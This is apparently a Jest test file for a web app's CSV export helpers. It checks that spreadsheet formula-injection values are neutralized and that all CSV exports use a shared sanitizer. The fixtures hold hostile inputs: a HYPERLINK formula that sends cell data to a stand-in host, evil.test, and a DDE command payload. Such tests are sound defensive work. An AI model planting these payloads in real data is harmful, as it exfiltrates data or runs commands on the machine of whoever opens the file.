/** @jest-environment jsdom */
import fs from 'node:fs';
import path from 'node:path';

import { exportClientsToCSV } from '@/app/staff/finance/utils/export';
import { csvCell, spreadsheetSafeText, toCsv } from '@/lib/csv';

describe('CSV for spreadsheets (FE-05)', () => {
    test.each([
        ['=HYPERLINK("https://evil.test/?d="&C3,"Открыть")', `'=HYPERLINK("https://evil.test/?d="&C3,"Открыть")`],
        ['+cmd|\' /C calc\'!A0', `'+cmd|' /C calc'!A0`],
        ['-2+3+cmd', `'-2+3+cmd`],
        ['@SUM(A1:A9)', `'@SUM(A1:A9)`],
        ['  =1+1', `'  =1+1`],
        ['"=1+1', `'"=1+1`],
        ['＝IMPORTXML(A1)', `'＝IMPORTXML(A1)`],
        ['Анна;=HYPERLINK(1)', `Анна;'=HYPERLINK(1)`],
        ['line\nbreak', 'line break'],
    ])('a formula starter is neutralized: %s', (input, expected) => {
        expect(spreadsheetSafeText(input)).toBe(expected);
    });

    test.each(['Айгерим', '-', '0.00', '-12.50', '+996555123456', '0555 12-34-56', '(0555) 123-456', 'Иван-Петров', ''])('ordinary values stay as they are: %p', (value) => {
        expect(spreadsheetSafeText(value)).toBe(value);
    });

    test('cells are quoted, inner quotes doubled, rows joined with LF', () => {
        expect(csvCell('say "hi"')).toBe('"say ""hi"""');
        expect(csvCell(null)).toBe('""');
        expect(toCsv([['a', 1], ['=b', undefined]])).toBe('"a","1"\n"\'=b",""');
    });

    test('the finance clients export neutralizes a guest name planted as a formula', async () => {
        let captured: Blob | undefined;
        const previousCreate = URL.createObjectURL;
        const previousRevoke = URL.revokeObjectURL;
        URL.createObjectURL = jest.fn((blob: Blob | MediaSource) => { captured = blob as Blob; return 'blob:test'; });
        URL.revokeObjectURL = jest.fn();
        const click = jest.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
        try {
            exportClientsToCSV(
                [{ id: 'i-1', clientName: '=HYPERLINK("https://evil.test/?d="&C3,"Чек")', serviceName: 'Стрижка', serviceAmount: 500, consumablesAmount: 0, createdAt: '2026-11-18T06:00:00Z' }] as never,
                null,
                new Date('2026-11-18T06:00:00Z'),
                'Мастер',
            );
            const csv = await new Promise<string>((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = () => resolve(String(reader.result));
                reader.onerror = reject;
                reader.readAsText(captured!);
            });
            expect(csv).toContain(`"'=HYPERLINK(""https://evil.test/?d=""&C3,""Чек"")"`);
            expect(csv).toContain('"Стрижка","500.00","0.00","500.00"');
        } finally {
            URL.createObjectURL = previousCreate;
            URL.revokeObjectURL = previousRevoke;
            click.mockRestore();
        }
    });

    test('every CSV in the web app is built by the shared helper', () => {
        const root = path.resolve(__dirname, '..', '..');
        const files: string[] = [];
        const walk = (dir: string) => fs.readdirSync(dir, { withFileTypes: true }).forEach((entry) => {
            const full = path.join(dir, entry.name);
            if (entry.isDirectory()) { if (entry.name !== '__tests__') walk(full); } else if (/\.tsx?$/.test(entry.name)) files.push(full);
        });
        walk(root);
        const builders = files
            .filter((file) => /text\/csv/.test(fs.readFileSync(file, 'utf8')))
            .filter((file) => !/\btoCsv\(/.test(fs.readFileSync(file, 'utf8')))
            .map((file) => path.relative(root, file));
        expect(builders).toEqual([]);
    });
});
